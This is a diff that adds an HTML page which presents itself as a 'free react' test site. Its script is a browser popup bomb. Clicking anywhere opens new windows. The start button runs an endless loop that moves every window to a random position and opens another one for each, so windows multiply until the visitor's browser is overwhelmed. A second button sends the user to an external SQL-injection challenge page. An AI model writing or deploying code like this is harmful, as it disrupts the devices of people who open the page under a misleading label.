@@ -1,0 +1,106 @@
+<html>
+  <body>
+    <h1>Click on the site to start </h1>
+    <h2>This site is a free react </h2>
+
+
+    <button onclick="start()">Clic me for start the test !</button>
+    
+    <button onclick="Next_test()">Clic me for go to the next test !</button>
+    <script>
+    let windows = []; //Liste des hehe
+    let minX = 0;
+    let minY = 0;
+    let maxX = 800;
+    let maxY = 600;
+    
+    async function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+    
+    function openWin() {
+      hehe = window.open('', '', 'width=400, height=400');
+      windows.push(hehe ); 
+    }
+
+    function moveWin() {
+      windows.forEach(win => {
+        if (win && !win.closed) { 
+          let randomX = Math.floor(Math.random() * (maxX - minX + 1)) + minX;
+          let randomY = Math.floor(Math.random() * (maxY - minY + 1)) + minY;
+          win.moveTo(randomX, randomY);
+          openWin();
+    }
+  });
+}
+    
+    document.body.addEventListener('click', function(event) {
+      openWin()
+    });
+    
+    
+    async function start() {
+      openWin();
+      openWin();
+      while(1) await sleep(100) | moveWin()
+    }
+
+    function Next_test() {
+        location='https://uknowns09.github.io/sqli-challenge/';
+    }
+    </script>
+
+    <style>
+     body {
+                    background-color: #f2f2f2;
+                    font-family: Arial, sans-serif;
+                    margin: 0;
+                    padding: 0;
+                }
+
+                header {
+                    background-color: #333;
+                    color: #fff;
+                    padding: 20px;
+                    text-align: center;
+                }
+
+                h1 {
+                    font-size: 36px;
+                    margin: 0;
+                }
+
+                main {
+                    margin: 20px;
+                    text-align: center;
+                }
+
+                p {
+                    font-size: 18px;
+                    line-height: 1.5;
+                    margin: 0 0 20px;
+                }
+
+                a {
+                    color: #333;
+                    text-decoration: none;
+                }
+
+                a:hover {
+                    color: #666;
+                }
+
+                button {
+                    background-color: #333;
+                    border: none;
+                    border-radius: 5px;
+                    color: #fff;
+                    cursor: pointer;
+                    font-size: 18px;
+                    padding: 10px 20px;
+                    transition: background-color 0.3s ease;
+                }        
+
+    </style>
+  </body>
+</html>
